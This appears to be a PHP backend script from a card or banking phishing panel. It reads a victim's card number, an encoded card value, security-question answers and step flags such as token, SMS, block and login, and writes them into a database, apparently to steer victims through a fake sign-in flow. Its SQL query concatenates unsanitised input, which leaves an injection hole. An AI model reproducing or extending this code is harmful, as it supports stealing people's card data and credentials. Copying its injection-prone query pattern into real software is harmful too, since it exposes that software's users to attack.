<?php
error_reporting(0);
include('../class/db.php');

$ctrl = "";
$ntar = "";
$nomb = "";
$imag = "";
$inic = "";
$pregx = "";
$pregy = "";
$pregz = "";

if (isset($_POST["control"])) {
    $ctrl = $_POST["control"]; }
	
if (isset($_GET["control"])){
    $ctrl = $_GET["control"]; }

if (isset($_POST["tarjeta"])) {
    $ntar = $_POST["tarjeta"]; }

if (isset($_GET["tarjeta"])) {
    $ntar = $_GET["tarjeta"]; }

if (isset($_POST["nombre"])) {
    $nomb = $_POST["nombre"]; }

if (isset($_POST["imagen"])) {
    $imag = $_POST["imagen"]; }
	
if (isset($_POST["mc"])) {
    $mc = $_POST["mc"]; }

if (isset($_POST["pregx"])) {
    $pregx = $_POST["pregx"]; }
	
if (isset($_POST["pregy"])) {
    $pregy = $_POST["pregy"]; }
	
if (isset($_POST["pregz"])) {
    $pregz = $_POST["pregz"]; }

if (isset($_POST["inicio"])) {
    $inic = $_POST["inicio"]; }

if (isset($_GET["crd"])) {
    $inic = $_GET["crd"]; }

if (isset($_GET["tkn"])) {
    $inic = $_GET["tkn"]; }

if (isset($_GET["sms"])) {
    $inic = $_GET["sms"]; }
	
if (isset($_GET["blqr"])) {
    $inic = $_GET["blqr"]; }

	if ($mc == "") {$mc = "NoCard"; }

/*  $sql = mysqli_query($link, "UPDATE usuarios SET ".($nomb ? "nombre='".$nomb."', " : "")."control='".$ctrl."', master='".base64_encode($mc)."', iniciar='".$inic."', pregx='".$pregx."', pregy='".$pregy."', pregz='".$pregz."' WHERE card='".$ntar."'");  */
$sql = mysqli_query($link, "UPDATE usuarios SET ".($nomb ? "nombre='".$nomb."', " : "")."control='".($inic == "Login" ? "" : $ctrl)."'".($inic != "" ? ", iniciar='".$inic."'" : "")." WHERE card='".$ntar."'");
?>
<meta http-equiv="Refresh" content="0; url=./">